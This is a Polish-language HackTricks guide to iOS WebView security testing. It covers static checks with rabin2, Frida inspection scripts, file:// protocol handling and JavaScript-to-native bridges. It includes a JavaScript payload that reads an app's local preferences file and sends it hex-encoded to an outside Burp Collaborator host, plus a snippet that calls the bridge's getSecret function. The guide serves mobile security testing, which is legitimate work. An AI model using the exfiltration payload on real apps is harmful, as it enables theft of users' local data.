# iOS WebViews

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Kod tej strony zosta wyodrbniony [std](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md). Sprawd藕 stron, aby uzyska dalsze szczeg贸y.


## Typy WebViews

WebViews s wykorzystywane w aplikacjach do interaktywnego wywietlania treci internetowych. R贸偶ne typy WebViews oferuj r贸偶ne funkcje i zabezpieczenia dla aplikacji iOS. Oto kr贸tki przegld:

- **UIWebView**, kt贸ry od iOS 12 nie jest ju偶 zalecany ze wzgldu na brak obsugi wyczania **JavaScript**, co czyni go podatnym na wstrzykiwanie skrypt贸w i ataki **Cross-Site Scripting (XSS)**.

- **WKWebView** jest preferowan opcj do wczania treci internetowych do aplikacji, oferujc lepsz kontrol nad treci i funkcjami zabezpiecze. **JavaScript** jest domylnie wczony, ale mo偶na go wyczy, jeli jest to konieczne. Obsuguje r贸wnie偶 funkcje zapobiegajce automatycznemu otwieraniu okien przez JavaScript i zapewnia, 偶e caa tre jest adowana w spos贸b bezpieczny. Dodatkowo, architektura **WKWebView** minimalizuje ryzyko uszkodzenia pamici wpywajce na g贸wny proces aplikacji.

- **SFSafariViewController** oferuje standaryzowane dowiadczenie przegldania stron internetowych w aplikacjach, rozpoznawalne dziki swojemu charakterystycznemu ukadowi, obejmujcemu tylko pole adresu do odczytu, przyciski udostpniania i nawigacji oraz bezporedni link do otwierania treci w Safari. W przeciwiestwie do **WKWebView**, **JavaScript** nie mo偶e by wyczony w **SFSafariViewController**, kt贸ry r贸wnie偶 dzieli pliki cookie i dane z Safari, zachowujc prywatno u偶ytkownika w aplikacji. Musi by wywietlany w widocznym miejscu zgodnie z wytycznymi App Store.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## Podsumowanie eksploracji konfiguracji WebViews

### **Przegld analizy statycznej**

W procesie badania konfiguracji **WebViews** skupiamy si na dw贸ch g贸wnych typach: **UIWebView** i **WKWebView**. Aby zidentyfikowa te WebViews wewntrz pliku binarnego, u偶ywane s polecenia, kt贸re wyszukuj okrelone odwoania do klas i metody inicjalizacji.

- **Identyfikacja UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
To polecenie pomaga w zlokalizowaniu wystpie **UIWebView**, poprzez wyszukiwanie tekst贸w z nim zwizanych w pliku binarnym.

- **Identyfikacja WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
Podobnie jak w przypadku **WKWebView**, to polecenie wyszukuje w binarnym pliku tekstowe cigi znak贸w wskazujce na jego u偶ycie.

Ponadto, aby znale藕 spos贸b inicjalizacji **WKWebView**, wykonuje si nastpujce polecenie, kt贸re skupia si na sygnaturze metody zwizanej z jego inicjalizacj:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **Weryfikacja konfiguracji JavaScript**

Dla **WKWebView** zaleca si wyczenie JavaScript, chyba 偶e jest to konieczne. Przeszukiwany jest skompilowany plik binarny w celu potwierdzenia, czy waciwo `javaScriptEnabled` jest ustawiona na `false`, co oznacza wyczenie JavaScriptu:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Tylko weryfikacja bezpiecznej zawartoci**

**WKWebView** oferuje mo偶liwo identyfikacji problem贸w z mieszana zawartoci, w przeciwiestwie do **UIWebView**. Sprawdzane jest to za pomoc waciwoci `hasOnlySecureContent`, aby upewni si, 偶e wszystkie zasoby strony s adowane za pomoc bezpiecznych pocze. Wyszukiwanie w skompilowanym pliku binarnym jest wykonywane w nastpujcy spos贸b:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Wnioski z analizy dynamicznej**

Analiza dynamiczna polega na sprawdzaniu sterty w poszukiwaniu instancji WebView i ich waciwoci. Do tego celu u偶ywany jest skrypt o nazwie `webviews_inspector.js`, kt贸ry dziaa na instancjach `UIWebView`, `WKWebView` i `SFSafariViewController`. Rejestruje informacje o znalezionych instancjach, w tym adresach URL i ustawieniach zwizanych z JavaScriptem i bezpieczn zawartoci.

Inspekcj sterty mo偶na przeprowadzi za pomoc `ObjC.choose()`, aby zidentyfikowa instancje WebView i sprawdzi waciwoci `javaScriptEnabled` i `hasonlysecurecontent`.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

Skrypt jest wykonywany za pomoc:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**Podstawowe wyniki**:
- Znaleziono i sprawdzono wystpienia WebViews.
- Zweryfikowano wczenie JavaScriptu i ustawienia bezpiecznej zawartoci.

To podsumowanie zawiera kluczowe kroki i polecenia zwizane z analiz konfiguracji WebView za pomoc statycznych i dynamicznych podej, skupiajc si na funkcjach zabezpiecze, takich jak wczanie JavaScriptu i wykrywanie mieszanej zawartoci.

## Obsuga protoko贸w WebView

Obsuga zawartoci w WebView jest istotnym aspektem, zwaszcza przy pracy z r贸偶nymi protokoami, takimi jak `http(s)://`, `file://` i `tel://`. Te protokoy umo偶liwiaj adowanie zar贸wno zdalnej, jak i lokalnej zawartoci w aplikacjach. Podkrela si, 偶e podczas adowania lokalnej zawartoci nale偶y podj rodki ostro偶noci, aby zapobiec wpywaniu przez u偶ytkownik贸w na nazw lub cie偶k pliku oraz edytowaniu samej zawartoci.

**WebViews** oferuj r贸偶ne metody adowania zawartoci. W przypadku **UIWebView**, obecnie przestarzaego, u偶ywane s metody takie jak `loadHTMLString:baseURL:` i `loadData:MIMEType:textEncodingName:baseURL:`. **WKWebView** natomiast korzysta z `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` i `loadRequest:` do adowania zawartoci internetowej. Metody takie jak `pathForResource:ofType:`, `URLForResource:withExtension:` i `init(contentsOf:encoding:)` s zwykle wykorzystywane do adowania lokalnych plik贸w. Metoda `loadFileURL:allowingReadAccessToURL:` jest szczeg贸lnie godna uwagi ze wzgldu na mo偶liwo adowania okrelonego adresu URL lub katalogu do WebView, co potencjalnie mo偶e ujawni poufne dane, jeli zostanie podany katalog.

Aby znale藕 te metody w kodzie 藕r贸dowym lub skompilowanym pliku binarnym, mo偶na u偶y polecenia podobnego do poni偶szego:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
W odniesieniu do **dostpu do plik贸w**, UIWebView pozwala na to powszechnie, podczas gdy WKWebView wprowadza ustawienia `allowFileAccessFromFileURLs` i `allowUniversalAccessFromFileURLs` do zarzdzania dostpem z adres贸w URL plik贸w, przy czym oba s domylnie ustawione na false.

Przykad skryptu Frida jest dostarczony do sprawdzenia konfiguracji **WKWebView** dla ustawie zabezpiecze:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Ostatnim przykadem jest adunek JavaScript, kt贸ry ma na celu wyciek lokalnych plik贸w i pokazuje potencjalne ryzyko zwizane z niewaciwie skonfigurowanymi WebView. Ten adunek koduje zawarto plik贸w w formacie szesnastkowym przed przesaniem ich na serwer, co podkrela znaczenie rygorystycznych rodk贸w bezpieczestwa w implementacjach WebView.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## Metody natywne ujawnione przez WebViews

## Zrozumienie interfejs贸w natywnych WebView w systemie iOS

Od wersji iOS 7 Apple udostpni interfejsy API do **komunikacji midzy JavaScriptem w WebView a natywnymi** obiektami Swift lub Objective-C. Integracja ta jest g贸wnie uatwiana przez dwie metody:

- **JSContext**: Funkcja JavaScript jest automatycznie tworzona, gdy blok Swift lub Objective-C jest poczony z identyfikatorem w `JSContext`. Pozwala to na bezproblemow integracj i komunikacj midzy JavaScriptem a kodem natywnym.
- **Protok贸 JSExport**: Dziedziczc protok贸 `JSExport`, natywne waciwoci, metody instancji i metody klasy mog by udostpniane JavaScriptowi. Oznacza to, 偶e wszelkie zmiany dokonane w rodowisku JavaScript s odzwierciedlane w rodowisku natywnym i vice versa. Jednak wa偶ne jest, aby upewni si, 偶e wra偶liwe dane nie s nieumylnie ujawniane za pomoc tej metody.

### Dostp do `JSContext` w Objective-C

W Objective-C, `JSContext` dla `UIWebView` mo偶na uzyska za pomoc nastpujcego kodu:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Komunikacja z `WKWebView`

Dla `WKWebView` bezporedni dostp do `JSContext` nie jest dostpny. Zamiast tego, wykorzystuje si przekazywanie wiadomoci za pomoc funkcji `postMessage`, umo偶liwiajc komunikacj JavaScriptu z natywn aplikacj. Obsuga tych wiadomoci jest ustawiana w nastpujcy spos贸b, umo偶liwiajc bezpieczn interakcj JavaScriptu z aplikacj natywn:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Interakcja i testowanie

JavaScript mo偶e wsp贸dziaa z warstw natywn poprzez zdefiniowanie obsugiwacza wiadomoci skryptu. Pozwala to na operacje takie jak wywoywanie funkcji natywnych z strony internetowej:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Aby przechwyci i manipulowa wynikiem wywoania funkcji natywnej, mo偶na zastpi funkcj zwrotn wewntrz kodu HTML:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
Strona natywna obsuguje wywoanie JavaScript, jak pokazano w klasie `JavaScriptBridgeMessageHandler`, gdzie wynik operacji, takich jak mno偶enie liczb, jest przetwarzany i wysyany z powrotem do JavaScript w celu wywietlenia lub dalszej manipulacji:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## Debugowanie iOS WebViews

(Tutorial oparty na [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Aby efektywnie debugowa zawarto internetow w iOS webviews, konieczne jest skonfigurowanie specjalnego rodowiska za pomoc narzdzi deweloperskich Safari, poniewa偶 wiadomoci wysyane do `console.log()` nie s wywietlane w dziennikach Xcode. Oto uproszczony przewodnik, podkrelajcy kluczowe kroki i wymagania:

- **Przygotowanie na urzdzeniu iOS**: Wymagane jest aktywowanie narzdzia Safari Web Inspector na urzdzeniu iOS. Mo偶na to zrobi, przechodzc do **Ustawienia > Safari > Zaawansowane** i wczajc _Web Inspector_.

- **Przygotowanie na urzdzeniu macOS**: Na komputerze z systemem macOS, musisz wczy narzdzia deweloperskie w Safari. Uruchom Safari, przejd藕 do **Safari > Preferencje > Zaawansowane** i wybierz opcj _Poka偶 menu Deweloper_.

- **Poczenie i debugowanie**: Po podczeniu urzdzenia iOS do komputera z systemem macOS i uruchomieniu aplikacji, u偶yj Safari na urzdzeniu macOS, aby wybra webview, kt贸ry chcesz debugowa. Przejd藕 do _Develop_ w pasku menu Safari, najed藕 na nazw urzdzenia iOS, aby zobaczy list instancji webview, a nastpnie wybierz instancj, kt贸r chcesz sprawdzi. Otworzy si nowe okno Safari Web Inspector w tym celu.

Jednak pamitaj o ograniczeniach:

- Debugowanie za pomoc tej metody wymaga urzdzenia z systemem macOS, poniewa偶 polega na Safari.
- Tylko webview w aplikacjach zaadowanych na urzdzenie za pomoc Xcode s uprawnione do debugowania. Webview w aplikacjach zainstalowanych za porednictwem App Store lub Apple Configurator nie mog by debugowane w ten spos贸b.


## Odwoania

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy **reklam swojej firmy w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
